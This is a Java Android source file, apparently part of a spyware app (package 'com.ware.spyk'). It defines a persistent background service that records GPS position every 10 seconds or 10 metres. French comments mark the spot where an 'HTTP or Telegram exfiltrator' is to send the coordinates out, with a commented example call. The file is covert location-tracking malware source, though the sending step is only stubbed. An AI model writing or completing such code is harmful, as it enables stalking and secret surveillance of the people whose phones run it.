package com.ware.spyk;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.ActivityCompat;

    public class LocalisationService extends Service {

        private static final String TAG = "LocalisationService";
        private LocationManager locationManager;
        private LocationListener locationListener;

        @Override
        public void onCreate() {
            super.onCreate();

            // Initialisation du service de localisation
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    // À chaque changement de position, on récupère les données GPS
                    double latitude = location.getLatitude();
                    double longitude = location.getLongitude();

                    // Log ou stockage des coordonnées récupérées
                    Log.d(TAG, "Position capturée : " + latitude + ", " + longitude);

                    // 👉 Ici, tu pourras appeler ton exfiltrateur HTTP ou Telegram
                    // Exemple : HttpExfiltrator.sendLocation(latitude, longitude);
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override
                public void onProviderEnabled(String provider) {}
                @Override
                public void onProviderDisabled(String provider) {}
            };

            startLocationUpdates();
        }

        private void startLocationUpdates() {
            // Vérification des permissions avant de lancer la localisation
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Permission GPS manquante !");
                return;
            }

            // Mise à jour toutes les 10 secondes ou 10 mètres
            locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    10000,    // 10 000 ms = 10 sec
                    10,       // 10 mètres
                    locationListener
            );
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            // Lancement du service en mode persistant
            return START_STICKY;
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            if (locationManager != null && locationListener != null) {
                locationManager.removeUpdates(locationListener);
            }
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null; // On ne lie pas ce service à une activité
        }
    }
